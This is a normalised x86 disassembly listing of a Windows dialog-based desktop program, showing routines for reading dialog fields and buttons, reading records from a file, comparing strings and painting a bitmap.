add ebx 0x100
cmp ebx 0x7400
jle r-xdata
mov edx [ esp + 0x14 ]
mov eax ecx
shr eax 0x16
and eax 0x1f
cmp eax edx
jl r-xdata
mov edi 0x21
lea ebx [ ebx ]
lea ecx [ esp + 0x30 ]
call sub_415190
pop edi
pop ebx
cmp eax [ esp + 0x18 ]
jg r-xdata
mov eax [ esp + 0x24 ]
shr ecx 0x1b
cmp ecx eax
jl r-xdata
cmp ecx [ esp + 0x1c ]
jg r-xdata
mov eax [ esp + 0x246 ]
mov ecx [ esp + 0x2c ]
and eax 0x3f
cmp eax ecx
jl r-xdata
cmp eax [ esp + 0x20 ]
jg r-xdata
push esi
mov esi [ esp + 0x2c ]
mov ecx esi
call sub_419a00
push 0x2f
mov ecx esi
call sub_419a00
sub_41b5e0
push esi
push edi
mov edi [ SetDlgItemTextA@IAT ]
push r--data
mov esi ecx
mov eax [ esi + 0x40 ]
push 0x62d
push eax
call edi
mov ecx [ esi + 0x40 ]
push r--data
push 0x62e
push ecx
call edi
mov ecx esi
call sub_41a180
mov ecx esi
call sub_41b5c0
cmp eax 0x5
je r-xdata
mov eax 0x1
cmp eax 0x13
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ esi + 0x40 ]
push eax
push 0x62e
push edx
call [ GetDlgItem@IAT ]
push eax
call [ EnableWindow@IAT ]
pop edi
pop esi
retn
sub_41b650
sub esp 0x278
push ebx
push ebp
push esi
mov ebx ecx
push edi
mov [ esp + 0x18 ] ebx
mov [ esp + 0x280 ] 0xffffffff
call sub_41b5c0
mov ecx [ ebx + 0x40 ]
mov edi [ GetDlgItemInt@IAT ]
push 0x0
mov ebp eax
movzx eax [ ebp + rw-data ]
push 0x0
push 0x62d
push ecx
mov [ esp + 0x2c ] eax
call edi
mov edx [ ebx + 0x40 ]
push 0x0
push 0x0
push 0x62e
push edx
mov esi eax
call edi
cmp ebp 0x13
mov [ esp + 0x14 ] eax
jne r-xdata
mov eax [ ebx + 0x40 ]
push eax
lea ecx [ esp + 0x24 ]
call sub_415ea0
test eax eax
jne r-xdata
shl eax 0x8
or esi eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x278
retn
mov [ esp + 0x10 ] 0x3000
mov edi edi
push edi
mov edi [ esp + 0x1c ]
mov ecx edi
call sub_419a00
push 0x2f
mov ecx edi
call sub_419a00
jmp [ ebp * 4 + jump_table_41b870 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x1c ]
mov edi ebx
push ecx
or edi eax
push edi
lea ecx [ esp + 0x28 ]
call sub_415a70
cmp ebp 0x14
ja r-xdata
mov eax [ esp + 0x10 ]
add eax 0x100
cmp eax 0x7400
mov [ esp + 0x10 ] eax
jle r-xdata
movzx edx [ esp + 0x28 ]
shr edx 0x1
cmp edx esi
jmp r-xdata
movzx eax [ esp + 0x2a ]
cmp eax esi
jmp r-xdata
movzx ecx [ esp + 0x26 ]
shr ecx 0x1
jmp r-xdata
mov edx [ esp + 0x22 ]
and edx 0xf
cmp edx esi
jmp r-xdata
movzx eax [ esp + 0x230 ]
cmp eax esi
jmp r-xdata
mov eax [ esp + 0x232 ]
mov edx [ esp + 0x14 ]
mov ecx eax
and ecx 0xf
cmp ecx edx
jne r-xdata
movsx edx [ esp + 0x25a ]
cmp edx esi
jmp r-xdata
movsx eax [ esp + 0x25c ]
cmp eax esi
jmp r-xdata
movsx ecx [ esp + 0x25e ]
jmp r-xdata
movsx edx [ esp + 0x260 ]
cmp edx esi
jmp r-xdata
movsx eax [ esp + 0x262 ]
cmp eax esi
jmp r-xdata
movsx ecx [ esp + 0x258 ]
jmp r-xdata
movsx edx [ esp + 0x26a ]
cmp edx esi
jmp r-xdata
movsx eax [ esp + 0x266 ]
cmp eax esi
jmp r-xdata
movsx ecx [ esp + 0x268 ]
jmp r-xdata
movsx edx [ esp + 0x26e ]
cmp edx esi
jmp r-xdata
movsx eax [ esp + 0x270 ]
cmp eax esi
jmp r-xdata
movsx ecx [ esp + 0x272 ]
jmp r-xdata
movsx edx [ esp + 0x274 ]
cmp edx esi
jmp r-xdata
movsx eax [ esp + 0x278 ]
cmp eax esi
jmp r-xdata
movsx ecx [ esp + 0x276 ]
mov ebx 0x21
lea ecx [ esp + 0x20 ]
call sub_415190
jne r-xdata
cmp ecx esi
inc ebx
cmp ebx 0x7e
jle r-xdata
shr eax 0x4
and eax 0x1fff
cmp eax esi
je r-xdata
jmp r-xdata
sub_41b8e0
push ecx
mov eax [ esp + 0x8 ]
push ebx
push esi
push edi
mov edi [ SetFilePointer@IAT ]
push 0x0
mov esi ecx
mov edx [ esi + 0x15c ]
push 0x0
lea ecx [ eax * 4 - 0x4 ]
push ecx
push edx
call edi
mov edx [ esi + 0x15c ]
mov ebx [ ReadFile@IAT ]
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x4
lea ecx [ esp + 0x20 ]
push ecx
push edx
call ebx
movzx eax [ esp + 0x14 ]
mov ecx [ esi + 0x15c ]
push 0x0
push 0x0
push eax
push ecx
call edi
movsx eax [ esp + 0x16 ]
mov ecx [ esp + 0x18 ]
push 0x0
lea edx [ esp + 0x10 ]
push edx
mov edx [ esi + 0x15c ]
shl eax 0x1
push eax
push ecx
push edx
call ebx
movsx eax [ esp + 0x16 ]
pop edi
pop esi
pop ebx
pop ecx
retn 0x8
sub_41b960
mov eax [ esp + 0x4 ]
push esi
push edi
push 0x0
push 0x0
mov edi ecx
push eax
mov ecx rw-data
call sub_425b30
mov esi eax
cmp esi 0xffffffff
jne r-xdata
pop edi
mov eax esi
pop esi
retn 0x8
mov ecx [ rw-data ]
mov edx [ esp + 0x10 ]
push ecx
push edx
call sub_420ca0
add esp 0x4
push eax
mov eax [ edi + 0x40 ]
push 0x30
push 0x12d
push 0x12e
push eax
call sub_420e20
add esp 0x18
sub_41b9c0
mov eax 0x25a4
call sub_42a0c0
push ebx
mov ebx [ IsDlgButtonChecked@IAT ]
push ebp
push esi
push edi
mov esi ecx
mov eax [ esi + 0x40 ]
push 0x4a0
mov edi 0x1
xor ebp ebp
push eax
mov [ esp + 0x24 ] edi
mov [ esp + 0x18 ] ebp
mov [ esp + 0x28c ] 0xffffffff
call ebx
test eax eax
je r-xdata
mov ecx [ esi + 0x40 ]
push ebp
push ebp
push 0x4a6
push ecx
call [ GetDlgItemInt@IAT ]
mov edx [ esi + 0x40 ]
mov edi eax
push 0x4a2
push edx
mov [ esp + 0x20 ] edi
mov [ esp + 0x1c ] edi
call ebx
test eax eax
je r-xdata
mov eax 0x1e
mov [ esp + 0x18 ] eax
jmp r-xdata
mov ecx [ esi + 0x40 ]
push 0x4a1
push ecx
call ebx
test eax eax
je r-xdata
lea eax [ edi - 0x1 ]
inc edi
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] edi
mov [ esp + 0x14 ] edi
mov eax [ esp + 0x14 ]
mov edi 0x1
cmp eax edi
mov eax 0x1e
jge r-xdata
mov ecx [ esp + 0x14 ]
sub ecx 0x2
add edi 0x2
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] edi
cmp [ esp + 0x14 ] edi
jg r-xdata
mov [ esp + 0x18 ] eax
cmp [ esp + 0x18 ] eax
jle r-xdata
mov [ esp + 0x20 ] ebp
cmp [ esp + 0x18 ] eax
mov [ esp + 0x20 ] edi
jge r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x25a4
retn
mov ebp edi
push 0x12c
push r--data
mov ecx esi
call sub_41b960
cmp eax 0xffffffff
mov [ esi + 0x15c ] eax
je r-xdata
inc ebp
cmp ebp 0xf1
jle r-xdata
mov edx [ esi + 0x14 ]
push edx
push ebp
mov ecx esi
call sub_41b8e0
xor edi edi
cmp eax edi
je r-xdata
mov al [ esi + ebp + 0x4c ]
test al al
je r-xdata
mov ecx [ esi + 0x15c ]
mov ebx [ CloseHandle@IAT ]
push ecx
call ebx
mov eax [ esp + 0x1c ]
xor ebp ebp
cmp eax ebp
jne r-xdata
cmp [ esp + 0x1c ] edi
je r-xdata
push 0x12f
push r--data
mov ecx esi
call sub_41b960
cmp eax 0xffffffff
mov [ esi + 0x15c ] eax
je r-xdata
cmp [ esp + 0x20 ] ebp
jne r-xdata
mov ecx [ esp + 0x10 ]
test ecx ecx
jle r-xdata
lea eax [ esp + 0x28c ]
push eax
push ebp
mov ecx esi
mov [ esp + 0x24 ] edi
call sub_41b8e0
mov [ esp + 0x10 ] eax
jmp r-xdata
movsx eax [ esi + 0x18 ]
cmp [ esp + 0x10 ] eax
jle r-xdata
mov edi [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
mov ecx edi
cmp ecx eax
jg r-xdata
mov ebx [ esp + 0x10 ]
xor edi edi
test ebx ebx
jle r-xdata
mov edx [ esi + 0x40 ]
push edx
lea ecx [ esp + 0x28 ]
call sub_415ea0
test eax eax
jne r-xdata
lea esp [ esp ]
mov ecx [ esi + 0x15c ]
push ecx
call ebx
mov [ esp + 0x10 ] eax
movsx eax [ esi + 0x18 ]
mov ecx [ esp + 0x10 ]
cdq
sub eax edx
sar eax 0x1
cmp ecx eax
jg r-xdata
lea ecx [ ecx ]
mov edi [ esp + 0x10 ]
xor ebx ebx
cmp edi ebp
jle r-xdata
mov ecx [ esp + 0x10 ]
inc edi
cmp edi ecx
jl r-xdata
xor ecx ecx
test eax eax
jle r-xdata
mov eax [ esp + 0x1c ]
test eax eax
mov ecx esi
je r-xdata
inc edi
cmp edi ebx
jl r-xdata
movzx edx ax
push edx
mov ecx esi
call sub_419a00
push 0x2f
mov ecx esi
call sub_419a00
lea ecx [ esp + 0x24 ]
call sub_415190
jmp r-xdata
jmp r-xdata
mov bx [ esp + edi * 2 + 0x28c ]
test bx bx
je r-xdata
mov [ esp + edi * 2 + 0x28c ] 0x0
mov edx [ esi + 0x14 ]
mov ebp [ esp + 0x10 ]
lea eax [ esp + ebp * 2 + 0x28c ]
push eax
push edi
call sub_41b8e0
add ebp eax
mov [ esp + 0x10 ] ebp
lea edx [ esp + 0x28c ]
push edx
push edi
call sub_41b8e0
mov [ esp + 0x10 ] eax
mov [ esp + 0x1c ] 0x0
jmp r-xdata
mov ax [ esp + edi * 2 + 0x28c ]
test ax ax
je r-xdata
mov ax [ esp + ebx * 2 + 0x28c ]
cmp ax bp
je r-xdata
inc ecx
add edx 0x2
cmp ecx eax
jl r-xdata
mov eax [ esp + 0x18 ]
inc edi
cmp edi eax
jle r-xdata
inc ebx
cmp ebx edi
jl r-xdata
movzx eax ax
push eax
lea ecx [ esp + 0x28 ]
call sub_415e80
cmp eax [ esp + 0x14 ]
jl r-xdata
cmp [ edx ] bx
je r-xdata
mov [ esp + ebx * 2 + 0x28c ] bp
cmp eax [ esp + 0x18 ]
jg r-xdata
mov [ esp + ebx + 0x19fc ] al
jmp r-xdata
sub_41bcc0
push edi
mov edi eax
test edi edi
jne r-xdata
push ebx
push ebp
push esi
lea esp [ esp ]
pop edi
retn
mov edx [ esp + 0x14 ]
cmp [ edx + ebp ] 0x0
mov eax [ esp + 0x18 ]
jne r-xdata
mov ebx [ esp + 0x14 ]
mov esi edi
sub ebx edi
test eax eax
jne r-xdata
test eax eax
jne r-xdata
movzx eax [ esi ]
push eax
call sub_429b24
movzx ecx [ ebx + esi ]
add esp 0x4
cmp eax ecx
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov al [ edi ]
test al al
je r-xdata
pop esi
pop ebp
pop ebx
mov eax 0x1
pop edi
retn
mov al [ edi + ebp ]
test al al
je r-xdata
mov al [ esi + 0x1 ]
inc ebp
inc esi
test al al
jne r-xdata
mov al [ edi ]
xor ebp ebp
test al al
je r-xdata
pop esi
pop ebp
pop ebx
xor eax eax
pop edi
retn
pop esi
pop ebp
pop ebx
xor eax eax
pop edi
retn
cmp al 0x20
je r-xdata
cmp al 0x2c
je r-xdata
cmp [ ebx + esi ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
cmp al 0x20
jne r-xdata
sub_41bd70
push ecx
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov esi [ esp + 0x18 ]
neg esi
sbb esi esi
and esi 0xffffff80
add esi 0xff
push edi
sub ebp edx
lea esp [ esp ]
mov eax [ esp + 0x18 ]
cmp [ edi + eax ] 0x0
jne r-xdata
mov ecx edx
mov edi edi
mov al [ esp + 0x13 ]
inc edx
dec ebp
cmp al 0x1f
je r-xdata
mov al [ edi + edx ]
test al al
je r-xdata
xor ebx ebx
mov bl [ ecx ]
and eax esi
and ebx esi
cmp bl al
jne r-xdata
mov al [ edx ]
xor edi edi
test al al
mov [ esp + 0x13 ] al
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
js r-xdata
mov al [ ecx + 0x1 ]
inc edi
inc ecx
test al al
jne r-xdata
mov ecx [ esp + 0x1c ]
test ecx ecx
je r-xdata
xor eax eax
mov al [ ecx + ebp ]
test al al
je r-xdata
cmp al 0x1f
je r-xdata
sub_41be10
sub esp 0x200
push esi
push edi
mov edi [ SendDlgItemMessageA@IAT ]
push 0x0
push 0x0
push 0x147
mov esi ecx
mov eax [ esi + 0x40 ]
push 0x640
push eax
call edi
cmp eax 0x3
jle r-xdata
pop edi
pop esi
add esp 0x200
retn
mov edx [ esi + 0x40 ]
lea ecx [ esp + 0x8 ]
push ecx
push eax
push 0x148
push 0x640
push edx
call edi
push 0x134
call sub_420ca0
mov esi [ lstrcmpA@IAT ]
add esp 0x4
push eax
lea eax [ esp + 0xc ]
push eax
call esi
test eax eax
jne r-xdata
push 0x135
call sub_420ca0
add esp 0x4
push eax
lea ecx [ esp + 0xc ]
push ecx
call esi
test eax eax
jne r-xdata
pop edi
mov eax 0x4
pop esi
add esp 0x200
retn
push 0x136
call sub_420ca0
add esp 0x4
push eax
lea edx [ esp + 0xc ]
push edx
call esi
neg eax
sbb eax eax
and eax 0xfffffffa
add eax 0x6
pop edi
mov eax 0x5
pop esi
add esp 0x200
retn
sub_41bf00
sub esp 0x490
push ebx
push ebp
push esi
mov ebx ecx
push edi
mov [ esp + 0x30 ] ebx
mov [ esp + 0x298 ] 0xffffffff
call sub_41be10
lea ecx [ esp + 0x14 ]
push ecx
push 0x0
push 0x409
mov edi eax
mov eax [ ebx + 0x40 ]
push 0x642
push eax
mov [ esp + 0x34 ] edi
call [ SendDlgItemMessageA@IAT ]
mov edx [ ebx + 0x40 ]
mov esi [ IsDlgButtonChecked@IAT ]
push 0x643
push edx
mov ebp eax
call esi
mov [ esp + 0x24 ] eax
mov eax [ ebx + 0x40 ]
push 0x641
push eax
call esi
lea ecx [ esp + 0x2c ]
push ecx
lea edx [ esp + 0x38 ]
push edx
push 0x1e
push 0x4a6
mov ecx ebx
mov [ esp + 0x38 ] eax
call sub_41a2f0
cmp edi 0x5
je r-xdata
lea eax [ esp + 0x2a0 ]
xor esi esi
test ebp ebp
mov [ esp + 0x10 ] eax
jle r-xdata
cmp edi 0x6
je r-xdata
cmp edi 0x5
mov edx [ esp + 0x10 ]
mov [ edx ] 0x0
jne r-xdata
lea esp [ esp ]
cmp edi 0x3
je r-xdata
mov eax [ ebx + 0x40 ]
push eax
lea ecx [ esp + 0x3c ]
call sub_415ea0
test eax eax
jne r-xdata
mov al [ esp + 0x2a0 ]
test al al
lea edi [ esp + 0x2a0 ]
lea ecx [ esp + 0x2a0 ]
je r-xdata
mov eax [ ebx + 0x40 ]
push 0x10
push 0x137
push 0x138
push eax
call sub_420e20
mov ecx [ ebx + 0x40 ]
add esp 0x10
push 0x642
push ecx
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x490
retn
cmp edi 0x3
jne r-xdata
xor edi edi
xor edx edx
lea ecx [ esp + 0x2a0 ]
xor esi esi
test ebp ebp
mov [ esp + 0x10 ] ecx
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x490
retn
mov [ esp + 0x1c ] 0x3000
lea ecx [ ecx ]
mov [ edi ] 0x0
lea esp [ esp ]
movzx ecx ax
push ecx
call sub_429b24
mov edx [ esp + 0x14 ]
mov [ edx ] al
mov eax [ esp + 0x14 ]
add esp 0x4
inc eax
mov [ esp + 0x10 ] eax
movzx edx ax
push edx
call sub_429b24
push eax
lea eax [ esp + 0x18 ]
push eax
call sub_4188c0
add esp 0xc
jmp r-xdata
mov [ ecx ] 0x0
jmp r-xdata
nop
mov ebp [ esp + 0x18 ]
inc ebp
cmp ebp 0x7e
mov [ esp + 0x18 ] ebp
jle r-xdata
cmp eax [ esp + 0x2c ]
jg r-xdata
inc ecx
mov [ edi ] dl
mov al [ ecx ]
inc edi
test al al
jne r-xdata
cmp al 0x39
ja r-xdata
mov ecx [ esp + 0x14 ]
mov ax [ ecx + esi * 2 ]
test ah 0x7f
jne r-xdata
inc esi
cmp esi ebp
jl r-xdata
mov [ ecx ] 0x1f
mov ecx [ esp + 0x10 ]
inc ecx
cmp ax 0x213c
je r-xdata
mov ecx [ esp + 0x1c ]
mov ebx [ esp + 0x24 ]
mov esi [ esp + 0x20 ]
or ebp ecx
push 0x1
push ebp
lea ecx [ esp + 0x40 ]
call sub_415a70
movzx ecx [ esp + 0x38 ]
mov edx [ esp + 0x34 ]
mov eax ecx
shr eax 0x8
and eax 0x1f
cmp eax edx
jl r-xdata
mov eax [ esp + 0x1c ]
add eax 0x100
cmp eax 0x7400
mov [ esp + 0x1c ] eax
jle r-xdata
cmp esi 0x6
ja r-xdata
movzx edx al
mov al [ ecx + 0x1 ]
cmp al 0x30
jb r-xdata
movzx eax [ ecx + 0x1 ]
inc ecx
sub eax 0x30
cmp eax 0x4
jle r-xdata
mov eax [ esp + 0x14 ]
mov ax [ eax + esi * 2 ]
cmp ax 0x213d
je r-xdata
cmp ax 0x28
je r-xdata
mov [ esp + 0x18 ] 0x21
mov ebp [ esp + 0x18 ]
lea ecx [ esp + 0x38 ]
call sub_415190
mov esi [ esp + 0x30 ]
push ebp
mov ecx esi
call sub_419a00
push 0x2f
mov ecx esi
call sub_419a00
jmp [ esi * 4 + jump_table_41c4b0 ]
lea esi [ edx - 0x61 ]
cmp esi 0x14
ja r-xdata
xor eax eax
mov edi 0x1
mov edx 0x80
jmp r-xdata
cmp ax 0x214a
jne r-xdata
mov esi [ esp + 0x25c ]
mov ebx ecx
shr ebx 0xd
xor edi edi
test ebx ebx
mov [ esp + 0x10 ] esi
jle r-xdata
mov edi [ esp + 0x3c ]
mov esi [ esp + 0x260 ]
shr edi 0x6
xor ebx ebx
and edi 0x1f
mov [ esp + 0x10 ] esi
jle r-xdata
mov edx [ esp + 0x3c ]
mov esi [ esp + 0x25c ]
shr edx 0x6
and edx 0x1f
shr ecx 0xd
lea ebx [ edx + ecx ]
xor edi edi
test ebx ebx
mov [ esp + 0x10 ] esi
jle r-xdata
mov eax [ esp + 0x264 ]
xor edx edx
mov dl [ esp + 0x3a ]
xor esi esi
mov [ esp + 0x10 ] eax
and edx 0xf0
test dx dx
jbe r-xdata
movzx ebx [ esp + 0x3c ]
mov esi [ esp + 0x268 ]
shr ebx 0xb
xor edi edi
test ebx ebx
mov [ esp + 0x10 ] esi
jle r-xdata
mov eax [ esp + 0x254 ]
push 0x0
lea ecx [ esp + 0x2a4 ]
push ecx
jmp r-xdata
mov eax [ esp + 0x258 ]
push 0x0
lea edx [ esp + 0x2a4 ]
push edx
movzx esi [ esi + lookup_table_41c498 ]
jmp [ esi * 4 + jump_table_41c480 ]
inc esi
cmp esi ebp
jl r-xdata
cmp ax 0x29
je r-xdata
test edi edi
je r-xdata
lea ecx [ esp + 0x2a0 ]
push 0x0
push ecx
mov edx esi
call sub_41bd70
add esp 0x8
test eax eax
jne r-xdata
lea esp [ esp ]
mov eax [ esp + 0x28 ]
push eax
lea ecx [ esp + 0x2a4 ]
push ecx
mov edx esi
call sub_41bd70
add esp 0x8
test eax eax
jne r-xdata
lea ecx [ esp + 0x2a0 ]
push ebx
push ecx
call sub_41bcc0
add esp 0x8
test eax eax
jne r-xdata
lea eax [ esp + 0x2a0 ]
push 0x0
push eax
mov edx esi
call sub_41bd70
add esp 0x8
test eax eax
jne r-xdata
call sub_41bcc0
add esp 0x8
test eax eax
je r-xdata
movzx edx [ eax + rw-data ]
jmp r-xdata
movzx edx [ eax + rw-data ]
jmp r-xdata
movzx edx [ eax + rw-data ]
jmp r-xdata
movzx edx [ eax + rw-data ]
jmp r-xdata
movzx edx [ eax + rw-data ]
xor edi edi
jmp r-xdata
cmp ax 0x214b
jne r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
mov eax esi
lea edx [ eax + 0x1 ]
mov eax esi
lea edx [ eax + 0x1 ]
mov edx [ esp + 0x10 ]
mov eax edx
lea edi [ eax + 0x1 ]
mov eax esi
lea edx [ eax + 0x1 ]
and eax 0x7f00
cmp ax 0x2400
je r-xdata
test edi edi
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc edi
cmp edi ebx
lea esi [ esi + eax + 0x1 ]
mov [ esp + 0x10 ] esi
jl r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc ebx
cmp ebx edi
lea esi [ esi + eax + 0x1 ]
mov [ esp + 0x10 ] esi
jl r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc edi
cmp edi ebx
lea esi [ esi + eax + 0x1 ]
mov [ esp + 0x10 ] esi
jl r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
lea eax [ edx + eax + 0x1 ]
mov edx [ esp + 0x3a ]
shr edx 0x4
inc esi
and edx 0xf
cmp esi edx
mov [ esp + 0x10 ] eax
jl r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc edi
cmp edi ebx
lea esi [ esi + eax + 0x1 ]
mov [ esp + 0x10 ] esi
jl r-xdata
mov eax [ esp + 0x14 ]
mov al [ eax + esi * 2 ]
or al dl
mov [ ecx ] al
mov ecx [ esp + 0x10 ]
inc ecx
xor edx edx
jmp r-xdata
cmp ax 0x2500
jne r-xdata
jmp r-xdata
mov edx [ esp + 0x28 ]
push edx
lea eax [ esp + 0x2a4 ]
push eax
mov edx esi
call sub_41bd70
add esp 0x8
test eax eax
jne r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov [ esp + 0x10 ] ecx
mov ecx [ ebx + 0x40 ]
push 0x10
push 0x137
push 0x139
push ecx
call sub_420e20
mov edx [ ebx + 0x40 ]
add esp 0x10
push 0x642
push edx
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x490
retn
sub_41c4cc
nop
nop
nop
nop
mov ecx [ esp + 0x8 ]
sub esp 0x40
mov eax ecx
dec eax
push esi
je r-xdata
mov esi [ GetSystemMetrics@IAT ]
push 0x1
push 0x2e
call esi
lea eax [ eax + eax + 0x30 ]
push eax
push 0x2d
call esi
lea ecx [ eax + eax + 0x76 ]
mov eax [ esp + 0x5c ]
mov edx [ eax + 0x18 ]
mov eax [ eax + 0x1c ]
push ecx
mov ecx [ esp + 0x54 ]
push edx
push eax
push ecx
call [ MoveWindow@IAT ]
xor eax eax
pop esi
add esp 0x40
retn 0x10
sub eax 0xe
je r-xdata
push ebx
push ebp
mov ebp [ esp + 0x50 ]
push edi
lea eax [ esp + 0x10 ]
push eax
push ebp
call [ BeginPaint@IAT ]
mov esi eax
push esi
call [ CreateCompatibleDC@IAT ]
mov ecx [ rw-data ]
push 0x34c
push ecx
mov edi eax
call [ LoadBitmapA@IAT ]
mov ebx eax
push ebx
push edi
call [ SelectObject@IAT ]
push 0xf
call [ GetSysColor@IAT ]
push eax
push esi
call [ SetBkColor@IAT ]
push 0xcc0020
push 0x0
push 0x0
push edi
push 0x30
push 0x76
push 0x0
push 0x0
push esi
call [ BitBlt@IAT ]
push ebx
call [ DeleteObject@IAT ]
push edi
call [ DeleteDC@IAT ]
lea edx [ esp + 0x10 ]
push edx
push ebp
call [ EndPaint@IAT ]
pop edi
pop ebp
pop ebx
xor eax eax
pop esi
add esp 0x40
retn 0x10
sub eax 0x1f2
je r-xdata
mov esi [ esp + 0x54 ]
mov ecx esi
shr ecx 0x10
mov eax 0x2aaaaaab
imul ecx
mov ecx edx
sar ecx 0x2
mov edx ecx
shr edx 0x1f
add ecx edx
movzx edx si
mov eax 0x22b63cbf
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
lea ecx [ ecx + edx * 2 + 0x1 ]
mov edx [ esp + 0x48 ]
push ecx
push 0x5f7
push 0x111
push edx
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
xor eax eax
pop esi
add esp 0x40
retn 0x10
mov eax [ esp + 0x54 ]
mov edx [ esp + 0x50 ]
push eax
mov eax [ esp + 0x4c ]
push edx
push ecx
push eax
call [ DefWindowProcA@IAT ]
pop esi
add esp 0x40
retn 0x10
sub_41c630
push esi
push 0x0
push 0x5f0
mov esi ecx
call sub_41a840
push 0x0
push 0x5f2
mov ecx esi
call sub_41a840
push 0x0
push 0x5f4
mov ecx esi
call sub_41a840
mov ecx [ esi + 0x40 ]
mov [ esi + 0x3c ] 0x1
movzx eax [ rw-data ]
push eax
push 0x5f6
push ecx
call [ CheckDlgButton@IAT ]
mov [ esi + 0x3c ] 0x0
mov ecx esi
pop esi
jmp sub_41a180
sub_41c690
sub esp 0x288
push ebp
push esi
mov ebp ecx
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0xc ]
push ecx
push 0x4
push 0x5f0
mov ecx ebp
mov [ esp + 0x298 ] 0xffffffff
call sub_41a2f0
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x28 ]
push eax
push 0x14
push 0x5f2
mov ecx ebp
call sub_41a2f0
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x18 ]
push edx
push 0x18
push 0x5f4
mov ecx ebp
call sub_41a2f0
mov eax [ ebp + 0x40 ]
push 0x5f6
push eax
call [ IsDlgButtonChecked@IAT ]
mov ecx [ ebp + 0x40 ]
mov esi eax
neg esi
sbb esi esi
push ecx
and esi 0x3
lea ecx [ esp + 0x2c ]
mov [ esp + 0x24 ] esi
call sub_415ea0
test eax eax
jne r-xdata
pop esi
pop ebp
add esp 0x288
retn
push ebx
mov ebx [ esp + 0xc ]
push edi
mov [ esp + 0x14 ] 0x3000
lea esp [ esp ]
mov edx [ esp + 0x14 ]
mov edi [ esp + 0x10 ]
or edi edx
push esi
push edi
lea ecx [ esp + 0x38 ]
call sub_415a70
movzx ecx [ esp + 0x32 ]
mov eax ecx
shr eax 0x8
and eax 0x7
cmp eax ebx
jl r-xdata
cmp esi 0x3
jne r-xdata
cmp eax [ esp + 0x24 ]
jg r-xdata
mov eax [ esp + 0x10 ]
inc eax
cmp eax 0x7e
mov [ esp + 0x10 ] eax
jle r-xdata
mov esi [ esp + 0x264 ]
test esi esi
je r-xdata
mov eax [ esp + 0x2c ]
shr ecx 0xb
cmp ecx eax
jl r-xdata
mov eax [ esp + 0x14 ]
add eax 0x100
cmp eax 0x7400
mov [ esp + 0x14 ] eax
jle r-xdata
mov esi [ esp + 0x28 ]
cmp [ esi ] 0x0
je r-xdata
cmp ecx [ esp + 0x18 ]
jg r-xdata
mov [ esp + 0x10 ] 0x21
jmp r-xdata
lea ecx [ esp + 0x30 ]
call sub_415190
pop edi
pop ebx
cmp [ esi ] 0x7a
jne r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x1c ]
and eax 0x1f
cmp eax ecx
jl r-xdata
mov al [ esi + 0x3 ]
add esi 0x3
test al al
jne r-xdata
movzx eax [ esi + 0x1 ]
mov ecx eax
mov edx eax
sar ecx 0xa
sar edx 0x5
and ecx 0x7
and edx 0x1f
and eax 0x1f
cmp ecx ebx
jl r-xdata
cmp eax [ esp + 0x20 ]
jg r-xdata
cmp ecx [ esp + 0x24 ]
jg r-xdata
push edi
mov ecx ebp
call sub_419a00
push 0x2f
mov ecx ebp
call sub_419a00
cmp edx [ esp + 0x2c ]
jl r-xdata
cmp edx [ esp + 0x18 ]
jg r-xdata
cmp eax [ esp + 0x1c ]
jl r-xdata
cmp eax [ esp + 0x20 ]
jg r-xdata
push edi
mov ecx ebp
call sub_419a00
push 0x2f
mov ecx ebp
call sub_419a00
sub_41c860
mov edx [ esp + 0x4 ]
sub esp 0x204
push 0x200
lea eax [ esp + 0x8 ]
push eax
mov eax [ ecx ]
push edx
push eax
call [ GetDlgItemTextA@IAT ]
lea ecx [ esp ]
push ecx
lea edx [ esp + 0x8 ]
push r--data
push edx
call sub_42a0fd
mov eax [ esp + 0xc ]
add esp 0x210
retn 0x4
sub_41c8a0
mov eax [ esp + 0x8 ]
sub esp 0xc
push esi
push eax
mov esi ecx
lea ecx [ esp + 0x8 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov eax [ esp + 0x20 ]
mov ecx [ esi ]
add esp 0xc
lea edx [ esp + 0x4 ]
push edx
push eax
push ecx
call [ SetDlgItemTextA@IAT ]
pop esi
add esp 0xc
retn 0x8
sub_41c8e0
mov eax [ esp + 0x4 ]
cmp eax 0x2223
push esi
mov esi ecx
jne r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
push eax
call [ edx + 0x8 ]
mov edx [ esi + 0x10 ]
xor ecx ecx
cmp edx eax
setne cl
pop esi
mov eax ecx
retn 0x4
mov eax 0x1
pop esi
retn 0x4
sub_41c910
push ebx
mov ebx [ esp + 0x8 ]
